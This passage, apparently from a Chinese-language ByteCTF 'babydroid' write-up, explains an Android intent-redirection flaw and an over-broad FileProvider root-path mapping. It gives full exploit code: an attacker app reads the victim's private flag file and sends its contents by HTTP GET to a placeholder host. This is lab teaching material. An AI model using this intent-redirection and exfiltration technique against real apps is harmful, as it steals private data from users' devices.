权限（FLAG_GRANT_*），<br>同时 Provider 允许 URI 授权（grantUriPermissions&#x3D;true），且 file_paths.xml 允许映射到该文件，那么攻击者就可以“临时”读取这个具体文件。</p><p>好，总结完后我们可以最终利用漏洞</p><p>因为file provider设置为非导出，也就意味着外部无法访问。当需要进行文件共享的时候，需要在Intent中加入下面这些中Grant相关的flags <strong>,在这里使用前两个就可以</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">FLAG_GRANT_READ_URI_PERMISSION</span> <span class="operator">=</span> <span class="number">0x00000001</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">FLAG_GRANT_WRITE_URI_PERMISSION</span> <span class="operator">=</span> <span class="number">0x00000002</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">FLAG_GRANT_PERSISTABLE_URI_PERMISSION</span> <span class="operator">=</span> <span class="number">0x00000040</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">FLAG_GRANT_PREFIX_URI_PERMISSION</span> <span class="operator">=</span> <span class="number">0x00000080</span>;</span><br></pre></td></tr></table></figure><ul><li><p>FLAG_GRANT_READ_URI_PERMISSION：允许接收者读取 URI 的内容，即读取 URI 的数据，并在权限授予期间保持该权限。</p></li><li><p>FLAG_GRANT_WRITE_URI_PERMISSION：允许接收者写入 URI 的内容，即修改 URI 的数据，并在权限授予期间保持该权限。</p></li><li><p>FLAG_GRANT_PERSISTABLE_URI_PERMISSION：与LAG_GRANT_READ_URI_PERMISSION&#96;或 FLAG_GRANT_WRITE_URI_PERMISSION一起使用，表示允许接收者在授予许可后持久保存该权限。这意味着即使应用程序被关闭，权限也会保持有效，并且对 URI 的访问仍然是允许的。</p></li><li><p>FLAG_GRANT_PREFIX_URI_PERMISSION：允许接收者读取或写入指定 URI 的所有后代 URI，而不必单独为每个 URI 授予权限。</p></li></ul><p>因为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;provider</span><br><span class="line">    android:name=&quot;androidx.core.content.FileProvider&quot;</span><br><span class="line">    android:exported=&quot;false&quot;&gt;</span><br></pre></td></tr></table></figure><p>意思是：</p><blockquote><p><strong>外部 App 不能直接通过</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content://androidx.core.content.FileProvider/...</span><br></pre></td></tr></table></figure><p><strong>来访问这个 Provider</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">getContentResolver().openInputStream(</span><br><span class="line">    Uri.parse(&quot;content://androidx.core.content.FileProvider/xxx&quot;)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>这样会被直接拒绝</p></blockquote><p>但是Android 允许一种<strong>例外机制</strong>：</p><blockquote><p><strong>“Provider 自己通过 Intent，把某个 URI 的访问权临时交给别人”</strong></p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">是否 exported=true ?</span><br><span class="line">    是 → 允许（再看权限）</span><br><span class="line">    否 → 看有没有 URI permission</span><br><span class="line">              有 → 允许</span><br><span class="line">              没有 → 拒绝</span><br><span class="line">FLAG_GRANT_*</span><br><span class="line">显式“破例放行某一个 URI</span><br></pre></td></tr></table></figure><p>获得权限之后是构造URI去获得flag</p><p>真实文件路径是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/data/data/com.bytectf.babydroid/files/flag</span><br></pre></td></tr></table></figure><p>FileProvider 的 URI 是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content://&lt;authority&gt;/&lt;virtual-path&gt;/&lt;relative-path&gt;</span><br></pre></td></tr></table></figure><p>它完全由 <code>file_paths.xml</code> 决定。</p><p>因为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;paths&gt;</span><br><span class="line">    &lt;root-path name=&quot;root&quot; path=&quot;.&quot;/&gt;</span><br><span class="line">&lt;/paths&gt;</span><br></pre></td></tr></table></figure><table><thead><tr><th>XML</th><th>含义</th></tr></thead><tbody><tr><td>name&#x3D;”root”</td><td>URI 中的第一段路径</td></tr><tr><td>path&#x3D;”.”</td><td>映射到真实文件系统的根</td></tr></tbody></table><p>于是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content://authority/root/data/data/xxx/files/flag</span><br></pre></td></tr></table></figure><p>才会 <strong>映射到</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/data/data/xxx/files/flag</span><br></pre></td></tr></table></figure><p>因此有</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content://androidx.core.content.FileProvider/root/data/data/com.bytectf.babydroid/files/flag</span><br></pre></td></tr></table></figure><blockquote><p>不是硬规则</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;provider</span><br><span class="line">    android:name=&quot;androidx.core.content.FileProvider&quot;</span><br><span class="line">    android:authorities=&quot;androidx.core.content.FileProvider&quot;</span><br><span class="line">    ... /&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>android:authorities&#x3D;”com.example.app.fileprovider”</p><p>这样做的好处是：</p><ul><li>避免 authority 冲突</li><li>一看就知道是谁的 Provider</li></ul><p>因为总流程是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. 解析 URI</span><br><span class="line">2. 取出 authority = &quot;androidx.core.content.FileProvider&quot;</span><br><span class="line">3. 在已安装 App 的 AndroidManifest.xml 里查：</span><br><span class="line">   哪个 &lt;provider&gt; 声明了这个 authority</span><br><span class="line">4. 找到对应的 Provider 实例</span><br><span class="line">5. 交给它的 openFile() / query() 等方法处理</span><br></pre></td></tr></table></figure></blockquote><p>如何获得授权?</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bytectf.babydroid;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.app.Activity;</span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: classes3.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Vulnerable</span> <span class="keyword">extends</span> <span class="title class_">Activity</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.app.Activity</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> (Intent) getIntent().getParcelableExtra(<span class="string">&quot;intent&quot;</span>);</span><br><span class="line">        startActivity(intent);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有一个</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Intent intent = (Intent) getIntent().getParcelableExtra(&quot;intent&quot;);</span><br><span class="line">startActivity(intent);</span><br></pre></td></tr></table></figure><blockquote><p>getParcelableExtra(key) 的意思是：从“启动这个 Activity 的 Intent 的 extras（Bundle）里，按 key 取出一个 Parcelable 对象，并反序列化成 Java 对象。如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Intent</span><br><span class="line"> ├─ action</span><br><span class="line"> ├─ data</span><br><span class="line"> ├─ flags</span><br><span class="line"> └─ extras (Bundle)</span><br><span class="line">      ├─ &quot;intent&quot; -&gt; [一段 Parcelable 二进制数据]</span><br><span class="line">      ├─ &quot;foo&quot;    -&gt; &quot;bar&quot;</span><br><span class="line">      └─ ...</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>extras</code> 是一个 <strong>Bundle</strong>，本质是：<strong>key → value 的映射表</strong></p><p><strong>Parcelable &#x3D; Android 定义的一种“可跨进程序列化的对象格式”</strong></p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Intent inner = getIntent().getParcelableExtra(&quot;intent&quot;);</span><br></pre></td></tr></table></figure><p>这个的意思是得到Intent再把里面extra中的一个自称”intent”当成真正的Intent</p><p>到此漏洞利用全流程结束</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><p>可以编写如下脚本</p><p>MainActivity，本文末尾介绍了下各个函数的含义</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.bytectf.pwnbabydroid;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.net.Uri;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(getIntent().getAction() == <span class="string">&quot;evil&quot;</span> )&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> getContentResolver().openInputStream(getIntent().getData());</span><br><span class="line">                <span class="type">byte</span>[] flag = <span class="keyword">new</span> <span class="title class_">byte</span>[inputStream.available()];</span><br><span class="line">                inputStream.read(flag);</span><br><span class="line">                inputStream.close();</span><br><span class="line"></span><br><span class="line">                Log.d(<span class="string">&quot;PWN&quot;</span>, <span class="keyword">new</span> <span class="title class_">String</span>(flag));</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">HttpGetAsyncTask</span>().execute(<span class="string">&quot;http://xxx.xxx.xxx.xxx/?flag=&quot;</span> + <span class="keyword">new</span> <span class="title class_">String</span>(flag));</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="type">Intent</span> <span class="variable">intent_back</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(<span class="string">&quot;evil&quot;</span>);</span><br><span class="line">            intent_back.setClassName(getApplication().getPackageName(), MainActivity.class.getName());</span><br><span class="line">            intent_back.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION);</span><br><span class="line"> intent_back.setData(Uri.parse(<span class="string">&quot;content://androidx.core.content.FileProvider/root/data/data/com.bytectf.babydroid/files/flag&quot;</span>));</span><br><span class="line"></span><br><span class="line">            <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">            intent.setAction(<span class="string">&quot;com.bytectf.TEST&quot;</span>);</span><br><span class="line">            intent.setClassName(<span class="string">&quot;com.bytectf.babydroid&quot;</span>, <span class="string">&quot;com.bytectf.babydroid.Vulnerable&quot;</span>);</span><br><span class="line">            intent.putExtra(<span class="string">&quot;intent&quot;</span>, intent_back);</span><br><span class="line"></span><br><span class="line">            startActivity(intent);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">InputStream inputStream = getContentResolver().openInputStream(getIntent().getData());</span><br></pre></td></tr></table></figure><blockquote><p>用当前 App 的 ContentResolver，按 Intent 里携带的 URI，打开一个读取该资源内容的输入流</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ContentResolver cr = getContentResolver();</span><br></pre></td></tr></table></figure><p>含义是：向 Android 系统申请一个内容访问代理，不能直接和别的 App 的 ContentProvider 通信，必须通过 ContentResolver。</p><p>发送函数，注：LLeaves博客上的发送已经无法使用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bytectf.pwnbabydroid;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.AsyncTask;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.net.HttpURLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HttpGetAsyncTask</span> <span class="keyword">extends</span> <span class="title class_">AsyncTask</span>&lt;String, Void, String&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> String <span class="title function_">doInBackground</span><span class="params">(String... params)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> params[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">HttpURLConnection</span> <span class="variable">con</span> <span class="operator">=</span> (HttpURLConnection) <span class="keyword">new</span> <span class="title class_">URL</span>(url).openConnection();</span><br><span class="line">            con.setRequestMethod(<span class="string">&quot;GET&quot;</span>);</span><br><span class="line">            con.setConnectTimeout(<span class="number">5000</span>);</span><br><span class="line">            con.setReadTimeout(<span class="number">5000</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">int</span> <span class="variable">code</span> <span class="operator">=</span> con.getResponseCode();</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;HTTP &quot;</span> + code;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Exception: &quot;</span> + e.getMessage();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onPostExecute</span><span class="params">(String result)</span> &#123;</span><br><span class="line">        android.util.Log.d(<span class="string">&quot;PWN&quot;</span>, <span class="string">&quot;Send result: &quot;</span> + result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>此外Manifest需要为：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">manifest</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:tools</span>=<span class="string">&quot;http://schemas.android.com/tools&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">application</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:allowBackup</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:dataExtractionRules</span>=<span class="string">&quot;@xml/data_extraction_rules&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:fullBackupContent</span>=<span class="string">&quot;@xml/backup_rules&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:icon</span>=<span class="string">&quot;@mipmap/ic_launcher&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:label</span>=<span class="string">&quot;@string/app_name&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:roundIcon</span>=<span class="string">&quot;@mipmap/ic_launcher_round&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:supportsRtl</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:usesCleartextTraffic</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:theme</span>=<span class="string">&quot;@style/Theme.Pwnbabydroid&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:name</span>=<span class="string">&quot;.MainActivity&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.MAIN&quot;</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.INTERNET&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="其他的一些知识"><a href="#其他的一些知识" class="headerlink" title="其他的一些知识"></a>其他的一些知识</h2><p><a href="https://bbs.kanxue.com/thread-269447-1.htm">原创]Android APP漏洞之战（4）——Content Provider漏洞详解-Android安全-看雪安全社区｜专业技术交流与安全研究论坛</a></p><p>Android APP四大组件中Content Provider</p><p><strong>Intent 是 Android 的“跨组件通信消息”。</strong></p><p>它不存数据本身，而是<strong>描述一次动作&#x2F;请求</strong>：</p><ul><li>打开某个 Activity</li><li>发送一个广播</li><li>请求另一个 App 帮我做事</li><li>附带一些参数（extras）</li></ul><p>如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">startActivity(intent);      // 启动界面</span><br><span class="line">sendBroadcast(intent);      // 广播消息</span><br><span class="line">startService(intent);       // 启动服务</span><br></pre></td></tr></table></figure><p><strong>ContentProvider 是 Android 的“标准化数据访问接口”。</strong></p><p>它用来：</p><ul><li>向别的 App 提供数据</li><li>控制访问权限</li><li>隔离真实存储细节</li></ul><p>数据要给别人用，但不能把整个沙箱打开</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Cursor c = getContentResolver().query(uri, ...);</span><br><span class="line">InputStream in = getContentResolver().openInputStream(uri);</span><br></pre></td></tr></table></figure><p>App A 想让 App B 选一张图片</p><p>App B 有 ContentProvider（相册）</p><p>App B 用 Intent 返回：</p><ul><li>一个 <code>content://...</code> URI</li><li>外加 <code>FLAG_GRANT_READ_URI_PERMISSION</code></li></ul><p>App A 用 ContentResolver 读数据</p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260116091333530.png" alt="image-20260116091333530"></p><p>我们创建一个Content Provider，其他的应用可以通过使用ContentResolver来访问ContentProvider提供的数据，而ContentResolver通过uri来定位自己要访问的数据，所以我们要先了解URI</p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260116091412608.png" alt="image-20260116091412608"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scheme://authority/path?query#fragment</span><br></pre></td></tr></table></figure><table><thead><tr><th>部分</th><th>含义</th><th>是否必需</th></tr></thead><tbody><tr><td>scheme</td><td>使用什么协议&#x2F;规则</td><td>✅</td></tr><tr><td>authority</td><td>由谁来管</td><td>视 scheme</td></tr><tr><td>path</td><td>具体资源路径</td><td>视情况</td></tr><tr><td>query</td><td>参数</td><td>❌</td></tr><tr><td>fragment</td><td>片段</td><td>❌</td></tr></tbody></table><p>官方文档：<a href="https://developer.android.google.cn/guide/topics/providers/content-provider-basics.html?hl=zh-cn#java">Content provider 基础知识  | App data and files  | Android Developers</a></p><p><strong>Intent的完整结构</strong></p><p><strong>Action</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">intent.setAction(&quot;android.intent.action.VIEW&quot;);</span><br></pre></td></tr></table></figure><p>本质：一个字符串</p><p>含义：描述要执行的“动作类型”</p><p><strong>Data（URI + MIME type）</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">intent.setData(Uri.parse(&quot;content://...&quot;));</span><br></pre></td></tr></table></figure><p>类型：Uri</p><p>含义：操作的对象</p><p><strong>Category</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">intent.addCategory(Intent.CATEGORY_DEFAULT);</span><br></pre></td></tr></table></figure><p>多用于隐式 Intent</p><p>用来进一步筛选可匹配的组件</p><p>例如：</p><p>CATEGORY_LAUNCHER</p><p>CATEGORY_DEFAULT</p><p><strong>Component（显式目标）</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">intent.setClassName(pkg, cls);</span><br></pre></td></tr></table></figure><p>或</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">intent.setComponent(new ComponentName(pkg, cls));</span><br></pre></td></tr></table></figure><p>含义：</p><p>直接指定目标 Activity &#x2F; Service &#x2F; Receiver</p><p>一旦设置了 Component：</p><p>Action &#x2F; Category &#x2F; Data 的匹配就不重要了</p><p>系统不会再做 intent-filter 匹配</p><p><strong>Extras（Bundle）</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">intent.putExtra(&quot;key&quot;, value);</span><br></pre></td></tr></table></figure><p><strong>Flags</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);</span><br></pre></td></tr></table></figure><p>Flags 会影响：</p><p>Activity 启动栈</p><p>权限授予（非常关键）</p><p>任务行为</p><p><strong>intent-filter 匹配</strong> &#x3D;Android 在“你没指定要启动谁”的情况下，帮你从系统里找一个“愿意接这个 Intent 的组件”。</p><p><code>intent-filter</code> 写在 <strong>AndroidManifest.xml</strong> 里，比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;activity android:name=&quot;.Vulnerable&quot;&gt;</span><br><span class="line">    &lt;intent-filter&gt;</span><br><span class="line">        &lt;action android:name=&quot;com.bytectf.TEST&quot;/&gt;</span><br><span class="line">    &lt;/intent-filter&gt;</span><br><span class="line">&lt;/activity&gt;</span><br></pre></td></tr></table></figure><p>它的意思是：</p><blockquote><p><strong>如果有 Intent 的 action 是 <code>com.bytectf.TEST</code>，</strong></p><p><strong>系统可以把它交给我处理。”</strong></p></blockquote><p>如果 <strong>没有 setClass &#x2F; setComponent</strong>，系统会：</p><ol><li>看 intent 里有什么：<ul><li>action</li><li>data (URI &#x2F; MIME)</li><li>category</li></ul></li><li>扫描所有已安装 App 的 manifest</li><li>找 <code>&lt;intent-filter&gt;</code> 满足以下规则的组件：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Intent setClassName(String packageName, String className)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
